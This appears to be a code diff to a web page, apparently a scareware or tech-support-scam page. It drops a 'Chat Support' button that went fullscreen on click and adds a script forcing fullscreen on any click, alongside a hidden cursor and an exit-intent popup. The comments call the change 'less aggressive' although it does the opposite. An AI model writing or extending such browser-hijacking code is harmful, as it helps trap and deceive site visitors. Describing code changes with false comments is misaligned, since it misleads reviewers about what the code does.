@@ -130,7 +130,21 @@
 
     <!-- Added fullscreen button for less aggressive fullscreen -->
 
-	  <button id="fullscreen-btn" style="position: fixed; bottom: 20px; right: 20px; z-index: 999999999; padding: 10px 20px; background-color: #114d9a; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: 700;">Chat Support</button>
+	    <script>
+    function goFull() {
+      const elem = document.documentElement;
+
+      if (elem.requestFullscreen) elem.requestFullscreen();
+      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+
+      // Remove click listener after fullscreen (optional)
+      document.removeEventListener("click", goFull);
+    }
+
+    // Any click triggers fullscreen
+    document.addEventListener("click", goFull);
+  </script>
     
     <div class="bg" style="cursor:none">
       <div class="bgimg" style="top:0">
@@ -622,18 +636,7 @@
     </script>
 
     <!-- Updated fullscreen script: Now triggers only on button click (less aggressive) -->
-    <script>
-document.getElementById('fullscreen-btn').onclick = function() {
-    var elem = document.documentElement;
-    if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-    }
-};
-    </script>
+
 
     <!-- Updated exit-intent popup script: Added session check, 500ms delay, and better close handling -->
     <script>
@@ -816,6 +819,7 @@ document.getElementById('fullscreen-btn').onclick = function() {
 
 	
 </html>
+
 
 
 
